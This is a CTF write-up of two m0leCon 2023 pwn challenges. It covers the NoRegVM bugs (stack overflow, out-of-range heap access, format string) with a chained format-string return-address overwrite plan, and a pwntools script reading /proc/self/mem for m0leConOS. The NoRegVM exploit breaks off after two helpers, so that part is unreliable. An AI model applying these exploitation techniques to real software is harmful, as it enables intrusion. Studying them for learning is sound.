At meloCon 2023,  I attempted to solve two pwn challenges. The NoRegVM chall has multiple vulnerabilities but turned out that only the fmt vulnerability is exploitable. I utilized the double-staged fmt exploitation again which I just learned from the last week.



## Pwn

### NoRegVM

This challenge provided a binary serves a virtual machine where we can input the program text and memory region on the heap, and the program would interpret the program with our input memory region.
In the program, we can find several vulnerabilities here:

1. stack overflow in `len` function. Since we could control the memory region, it attempted to copy the contents to the stack buffer. However, this function 1. was safeguarded by a canary 2. doesn't allow copying null bytes.

    ```
    __int64 __fastcall len(int *a1)
    {
      int *v1; // rax
      int v2; // ecx
      int v4; // [rsp+14h] [rbp-DCh]
      int *v5; // [rsp+18h] [rbp-D8h]
      char s[200]; // [rsp+20h] [rbp-D0h] BYREF
      unsigned __int64 v7; // [rsp+E8h] [rbp-8h]
    
      v7 = __readfsqword(0x28u);
      v4 = 0;
      v5 = (int *)((char *)memory + 4 * *a1);
      while ( *v5 )
      {
        v1 = v5++;
        v2 = *v1;
        LODWORD(v1) = v4++;
        s[(int)v1] = v2;       
      }
      *((_DWORD *)memory + a1[1]) = strlen(s);
      return 2LL;
    }
    ```

    2. OOR through `pop_out`+`write_buf` on the heap. The program first attempted to copy data from the memory to the global memory named `output` and then print the content of the `output`. We could manipulate the index `a1` and assign it a negative value to make it point to other areas of interest.

        ```
        __int64 __fastcall pop_out(_DWORD *a1)
        {
          int v1; // ecx
          int v2; // eax
          int i; // [rsp+14h] [rbp-4h]
        
          for ( i = 0; i < a1[1]; ++i )
          {
            v1 = *((_DWORD *)memory + *a1 + i);
            v2 = out_pointer++;
            output[v2] = v1;
          }
          return 2LL;
        }
        
        __int64 __fastcall write_buf(int *a1, const char **a2)
        {
          if ( *a1 <= 199 )
            printf("%s", *a2);
          return 1LL;
        }
        ```

    3. OOW through `pop_in`+`read_buf` on heap, which is quite similar to 2.

    4. fmt vulnerability in `pop_out`. Instead of controlling the array index to determine which heap content was to be copied to the output variable, another OOW existed in the output variable. Notably, a format string was placed in the `.data` segment rather than the `.rodata` segment, suggesting that we could manipulate the format string.

        ![noreg-1](/static/images/melocon-CTF-2023-Writeup/noreg-1.png)

Previously, I didn't identify the fourth vulnerability. However, the second and third vulnerabilities are difficult to exploit because our controlled index will always be left-shifted (`shl`) by 2 bytes when used as an offset. However, only one byte (rather than four bytes) will be copied each time. Even though we could use a divide operation to `shr` 12 bytes by dividing 0x100, this is still unstable since sometimes the address will be viewed as a negative integer(the highest bit is `0x1`) and cause the wrong result.

```
def leak(index):
    p = add(0,index,2)
     
    for i in range(4):
        p += pop_out(0,1)
        p += div(0,0,3) # the third argument in memory region is 0x100

    p += write_buf()
    p += rst_out()

    return p
```

Consequently, we decided to exploit the format string vulnerability directly.

With all the mitigation mechanisms in place, our solution will proceed as follows:

```
Solution:
    1. leak the elf base address, libc base address and stack address
    2. use chained fmt exploit to overwrite the return address of main to one_gadget
    (since we could leak the addr, we don't need to bruteforce)
        2.1 leverage current rbp (an existing stack pointer) to make the pointer points to the return address of main
        2.2 leverage our modified stack pointer to overwrite the return address of main
    
    if the one_gadget cannot be satisfied, we can use the stack pivot technique to transfer the stack to the memory chunk or output buffer
```

We're leveraging the `double-stage (chained) fmt` technique once more, previously discussed in detail [here](https://jackfromeast.site/2023-05/ucsd-ctf-2023-writeup.html). However, since we can expose the stack address, there's no need for brute force on this occasion. The central concept behind this approach is to achieve an arbitrary address overwrite; we must have an address pointer that points to that address as the fmt argument. Generally, we have several strategies:

1. **Direct Address Input.** If we can manipulate the fmt arguments buffer and can also expose the address we want to overwrite, we could leverage a library like `fmt_str` to facilitate address overwrite.
2. **Utilizing the existing address pointer in the fmt arguments buffer.** In certain scenarios, we may not have control over the fmt arguments buffer. For instance, in this case, the fmt string is located on the .data segment (which is controllable), but we cannot write to the stack. In such cases, we can resort to using an existing address pointer. However, most of the time, we might not find the anticipated address pointer.
3. **Employing the double-stage (chained) fmt technique.** Building on the idea from the second approach, we could initially overwrite an existing address pointer that leads to our desired address. Subsequently, we use the altered address pointer to overwrite the target address.

The final exploit would look like this:

```
def add(destIndex,n1Index,n2Index):
    return p32(1) + p32(destIndex) + p32(n1Index) + p32(n2Index)
                          
def div(destIndex,dividendIndex,divisorIndex):
    return p32(4) + p32(destIndex) + p32(dividendIndex) + p32(divisorIndex)

### m0leConOS

We made an unintended way to solve this challenge. Specifically, we try to print out the `/proc/self/mem` content after the flag has been read to the segment. Even though the binary will `unmmap` the segment after reading, we still could read the content through `/proc/self/mem` as the operation will not clear out the saved content.

```
sh = start()

def m0lecat(fn):
    sh.sendline(b"m0lecat")
    sh.recvuntil(b"> ")
    sh.sendline(fn)
    sh.sendline()
    
    while True:
        log.info("Receiving...")
        content = sh.recv(1024, timeout=1)

        # find the index of "ptm"
        index = content.find(b"ptm")

        # if "ptm" is found, print the bytes after it
        if index != -1:
            log.info(content[index:index+40])
            break

    return content

def m0lecat1(fn):
    sh.sendline(b"m0lecat")
    sh.recvuntil(b"> ")
    sh.sendline(fn)
    sh.sendline()
    sh.sendline()

    content = sh.recvuntil(b"\x1B[1;")

    return content

def touch(fn, val):
    sh.recvuntil(b"# ")
    sh.sendline(b"touch")
    sh.recvuntil(b"Filename: ")
    sh.sendline(fn)
    sh.recvuntil(b"> ")
    sh.sendline(val)
    sh.recvuntil(b"Ok your file has been created!")

def exploit():
    sh.recvuntil(b"# ")
    m0lecat1(b"flag.txt")
    sh.recvuntil(b"# ")
    m0lecat(b"/proc/self/mem")

if __name__ == "__main__":
    exploit()
